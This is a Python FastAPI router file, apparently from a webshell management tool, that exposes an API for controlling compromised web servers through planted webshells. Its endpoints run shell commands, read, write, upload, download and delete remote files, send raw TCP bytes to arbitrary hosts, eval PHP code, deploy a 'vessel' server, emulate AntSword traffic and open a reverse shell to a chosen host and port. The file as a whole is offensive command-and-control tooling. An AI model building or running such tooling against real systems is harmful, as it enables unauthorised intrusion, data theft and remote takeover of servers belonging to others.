"""Session相关API路由"""
from pathlib import Path, PurePath, PurePosixPath, PureWindowsPath
from uuid import UUID, uuid4
from functools import wraps
import tempfile

import base64
import logging
import typing as t

import re
import chardet
from fastapi import APIRouter, Body, File, Form, Request, UploadFile
from fastapi.responses import  Response

from .. import session_manager, session_types, session_connector
from ..core import SessionInterface, PHPSessionInterface
from ..utils import db
from ..core import SessionException, UserError
from .. import file_transfer_status

from pydantic import BaseModel
from ..vessel_php.main import start_vessel_server



temp_dir = Path(tempfile.gettempdir())
temp_files: t.Dict[UUID, t.Tuple[str, Path]] = {}


def write_temp_blob(filename: str, blob: bytes):
    filepath = temp_dir / f"{str(uuid4())}.blob"
    filepath.write_bytes(blob)
    file_id = uuid4()
    temp_files[file_id] = (filename, filepath)
    return file_id


logger = logging.getLogger("main")
router = APIRouter()


def remote_path(filepath: str) -> PurePath:
    """自动猜测传入文件路径的类型为unix/windows, 并实例化成PurePath对象"""
    if re.match(r"^[a-zA-Z]:[/\\]", filepath):
        return PureWindowsPath(filepath)
    return PurePosixPath(filepath)


class FileContentRequest(BaseModel):
    current_dir: str
    filename: str
    text: str
    encoding: str


class PhpCodeRequest(BaseModel):
    code: str


def catch_user_error(fn):
    @wraps(fn)
    async def _wraps(*args, **kwargs):
        try:
            return await fn(*args, **kwargs)
        except SessionException as exc:
            return {
                "code": getattr(type(exc), "code", -500),
                "msg": f"{type(exc).__doc__}: {str(exc)}",
            }

    return _wraps


async def get_session(session_id: UUID):
    session: t.Union[session_types.SessionInfo, None] = (
        session_manager.get_session_info_by_id(session_id)
    )
    if not session:
        raise UserError("没有这个session")
    return session


async def list_sessions_readable():
    result = session_manager.list_sessions_db_readable() + [
        session_manager.session_to_readable(session)
        for session in session_connector.list_sessions()
    ]
    return result


@router.post("/test_webshell")
@catch_user_error
async def test_webshell(session_info: session_types.SessionInfo):
    """测试webshell"""
    session = session_manager.session_info_to_session(session_info)
    result = await session.test_usablility()
    if not result:
        return {"code": 0, "data": {"success": False, "msg": "Webshell无法使用"}}
    return {"code": 0, "data": {"success": True, "msg": "Webshell可以使用"}}


@router.post("/update_webshell")
async def update_webshell(session_info: session_types.SessionInfo):
    """添加或更新webshell"""
    if db.get_session_info_by_id(session_info.session_id):
        db.delete_session_info_by_id(session_info.session_id)
    db.add_session_info(session_info)
    session_manager.clear_session_cache()
    return {"code": 0, "data": session_info.session_id}


@router.get("/session")
@catch_user_error
async def api_list_sessions(session_id: t.Union[UUID, None] = None):
    """列出所有的session或者查找session"""
    if session_id is None:
        return {"code": 0, "data": await list_sessions_readable()}
    return {"code": 0, "data": await get_session(session_id)}


@router.get("/session/{session_id}")
@catch_user_error
async def api_get_session(session_id: UUID):
    """查找session"""
    return {"code": 0, "data": await get_session(session_id)}


@router.get("/session/{session_id}/execute_cmd")
@catch_user_error
async def session_execute_cmd(session_id: UUID, cmd: str):
    """使用session执行shell命令"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.execute_cmd(cmd)
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/get_pwd")
@catch_user_error
async def session_get_pwd(session_id: UUID):
    """获取session的pwd"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.get_pwd()
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/list_dir")
@catch_user_error
async def session_list_dir(session_id: UUID, current_dir: str):
    """使用session列出某个目录"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.list_dir(current_dir)
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/mkdir")
@catch_user_error
async def session_mkdir(session_id: UUID, dirpath: str):
    """使用session创建某个目录"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    await session.mkdir(dirpath)
    return {"code": 0, "data": True}


@router.get("/session/{session_id}/move_file")
@catch_user_error
async def session_move_file(session_id: UUID, filepath: str, new_filepath):
    """使用session移动某个文件"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    await session.move_file(filepath, new_filepath)
    return {"code": 0, "data": True}


@router.get("/session/{session_id}/copy_file")
@catch_user_error
async def session_copy_file(session_id: UUID, filepath: str, new_filepath):
    """使用session复制某个文件"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    await session.copy_file(filepath, new_filepath)
    return {"code": 0, "data": True}


@router.get("/session/{session_id}/get_file_contents")
@catch_user_error
async def session_get_file_contents(session_id: UUID, current_dir: str, filename: str):
    """使用session获取文件内容"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    content, detected_encoding = None, None
    path = remote_path(current_dir) / filename
    content = await session.get_file_contents(str(path))
    try:
        detected_encoding = chardet.detect(content)["encoding"]
        if detected_encoding is None or detected_encoding == "ascii":
            detected_encoding = "utf-8" if current_dir.startswith("/") else "gbk"
        text = content.decode(detected_encoding)
        return {"code": 0, "data": {"text": text, "encoding": detected_encoding}}
    except UnicodeDecodeError as exc:
        return {
            "code": -500,
            "msg": f"编码错误：检测出编码为{detected_encoding}，但是解码失败："
            + str(exc),
        }


@router.post("/session/{session_id}/put_file_contents")
@catch_user_error
async def session_put_file_contents(session_id: UUID, request: FileContentRequest):
    """使用session写入文件内容"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    path = remote_path(request.current_dir) / request.filename
    content = request.text.encode(request.encoding)
    success = await session.put_file_contents(str(path), content)
    return {"code": 0, "data": success}


@router.post("/session/{session_id}/upload_file")
@catch_user_error
async def session_upload_file(
    session_id: UUID,
    file: UploadFile = File(),
    folder: str = Form(),
):
    """使用session写入文件内容"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    filename = file.filename
    content = await file.read()
    if filename is None:
        return {"code": -400, "msg": "错误: 没有文件名"}
    path = remote_path(folder) / filename
    with file_transfer_status.record_upload_file(
        session_id, folder, filename
    ) as status_changer:
        success = await session.upload_file(str(path), content, callback=status_changer)
    return {"code": 0, "data": success}


@router.get("/session/{session_id}/download_file")
@catch_user_error
async def session_download_file(
    session_id: UUID,
    folder: str,
    filename: str,
):
    """使用session写入文件内容"""
    # 一个文件最多只有几十兆，浏览器应该可以轻松处理
    # 如果用户想要用webshell下载几百兆的文件。。。那应该是用户自己的问题
    filepath = remote_path(folder) / filename
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    with file_transfer_status.record_download_file(
        session_id, folder, filename
    ) as status_changer:
        content = await session.download_file(str(filepath), callback=status_changer)
    file_id = write_temp_blob(filename, content)
    return {
        "code": 0,
        "data": {
            "file_id": file_id,
        },
    }


@router.get("/session/{session_id}/delete_file")
@catch_user_error
async def session_delete_file(session_id: UUID, current_dir: str, filename: str):
    """使用session删除文件内容"""
    # TODO: 让所有webshell支持删除文件夹
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    path = remote_path(current_dir) / filename
    result = await session.delete_file(str(path))
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/supported_send_tcp_methods")
@catch_user_error
async def session_supported_send_tcp_methods(
    session_id: UUID,
):
    """使用session发送一段字节到某个TCP端口"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.get_send_tcp_support_methods()
    return {
        "code": 0,
        "data": result,
    }


@router.post("/session/{session_id}/send_bytes_tcp")
@catch_user_error
async def session_send_bytes_tcp(
    session_id: UUID,
    host: str = Body(),
    port: int = Body(),
    content_b64: str = Body(),
    send_method: t.Union[str, None] = Body(),
):
    """使用session发送一段字节到某个TCP端口"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.send_bytes_over_tcp(
        host, port, base64.b64decode(content_b64), send_method
    )
    if result is None:
        return {"code": -600, "msg": "受控端发送TCP失败"}
    return {
        "code": 0,
        "data": base64.b64encode(result),
    }


@router.get("/session/{session_id}/file_upload_status")
@catch_user_error
async def session_get_file_upload_status(session_id: UUID):
    """读取session正在上传的文件"""
    result = file_transfer_status.get_session_uploading_file(session_id)
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/file_download_status")
@catch_user_error
async def session_get_file_download_status(session_id: UUID):
    """读取session正在下载的文件"""
    result = file_transfer_status.get_session_downloading_file(session_id)
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/basicinfo")
@catch_user_error
async def session_get_basicinfo(session_id: UUID):
    """读取session的相关信息"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.get_basicinfo()
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/download_phpinfo")
@catch_user_error
async def session_download_phpinfo(session_id: UUID):
    """下载phpinfo"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    if not isinstance(session, PHPSessionInterface):
        return {"code": -400, "msg": "指定的session不是PHP Session"}
    content = await session.download_phpinfo()

    headers = {"Content-Disposition": "attachment; filename=phpinfo.html"}  # 设置文件名
    return Response(content=content, media_type="text/html", headers=headers)


@router.post("/session/{session_id}/php_eval")
@catch_user_error
async def session_php_eval(session_id: UUID, req: PhpCodeRequest):
    """eval对应代码"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    if not isinstance(session, PHPSessionInterface):
        return {"code": -400, "msg": "指定的session不是PHP Session"}
    result = await session.php_eval(req.code)
    return {"code": 0, "data": result}


@router.post("/session/{session_id}/open_reverse_shell")
@catch_user_error
async def session_open_reverse_shell(
    session_id: UUID,
    host: str = Body(),
    port: int = Body(),
):
    """eval对应代码"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    await session.open_reverse_shell(host, port)
    return {"code": 0, "data": True}


@router.get("/session/{session_id}/deploy_vessel")
@catch_user_error
async def session_deploy_vessel(session_id: UUID):
    """部署vessel server"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    if not isinstance(session, PHPSessionInterface):
        return {"code": -400, "msg": "指定的session不是PHP Session"}
    client_code = await start_vessel_server(session)
    return {"code": 0, "data": client_code}


@router.post("/session/{session_id}/emulated_antsword")
@catch_user_error
async def session_emulated_antsword(session_id: UUID, request: Request):
    """对接蚁剑"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    if not isinstance(session, PHPSessionInterface):
        return {"code": -400, "msg": "指定的session不是PHP Session"}
    body: bytes = await request.body()
    status_code, content = await session.emulated_antsword(body)
    return Response(status_code=status_code, content=content)


@router.delete("/session/{session_id}")
async def delete_session(session_id: UUID):
    """删除session"""
    session: t.Union[session_types.SessionInfo, None] = (
        session_manager.get_session_info_by_id(session_id)
    )
    if session is None:
        return {"code": -400, "msg": "没有这个session"}
    session_manager.delete_session_info_by_id(session_id)
    return {"code": 0, "data": True}
